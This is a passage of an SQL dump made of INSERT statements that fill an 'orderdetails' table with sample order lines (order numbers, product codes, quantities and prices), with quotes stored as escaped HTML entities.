(\u0026#39;10378\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;146.99\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;60.30\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;122.02\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;30.59\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;52.66\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;129.20\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;80.84\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10378\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;35.80\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10379\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;156.40\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10379\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;50.85\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10379\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;113.52\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10379\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;134.22\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10379\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;48.80\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;88.36\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;119.50\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;156.94\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;78.23\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;66.99\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;66.88\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;29.87\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;37.63\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;77.24\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;111.57\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;77.05\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;91.02\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10380\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;32.82\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;182.16\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;138.88\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;132.57\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;114.34\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;49.60\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;60.77\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;100.30\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;51.22\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10381\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;93.20\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;166.24\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;145.04\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;143.61\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;103.10\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;160.46\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;84.33\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;115.03\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;46.29\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;120.12\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;97.39\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;85.72\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;57.53\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10382\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;101.15\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;119.05\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;125.66\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;155.79\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;83.70\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;137.88\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;77.24\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;52.60\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;33.24\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;117.10\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;53.57\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;55.93\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;94.92\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10383\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;48.62\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10384\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;129.20\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10384\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;114.29\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10384\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;71.69\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10384\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;71.02\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10385\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;78.83\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10385\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;62.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;130.88\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;72.65\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;73.12\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;100.58\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;101.76\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;56.86\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;54.57\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;55.96\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;71.73\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;85.09\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;90.75\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;67.22\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;68.00\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;83.14\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;80.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;59.22\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;47.67\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10386\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;52.42\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10387\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;79.91\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;80.39\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;118.94\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;156.86\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;125.01\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;58.47\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;41.02\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;74.90\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10388\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;111.53\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;182.90\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;95.13\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;76.61\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;102.49\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;63.91\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;52.09\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;112.70\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10389\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;61.70\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;117.48\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;132.29\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;102.98\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;162.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;75.59\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;135.23\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;54.09\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;122.02\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;67.87\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;35.87\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;51.43\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;134.81\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;66.29\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;39.02\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;101.03\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10390\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;81.36\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;195.01\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;121.15\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;110.70\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;114.34\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;102.74\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;47.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;57.73\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;99.28\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;26.55\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10391\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;36.29\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10392\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;61.21\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10392\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;103.67\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10392\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;98.22\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;145.04\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;99.54\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;137.53\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;104.32\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;106.55\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;41.76\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;112.46\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;88.62\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;84.75\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;63.35\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10393\u0026#39;, \u0026#39;S700_2824\u0026#39;, 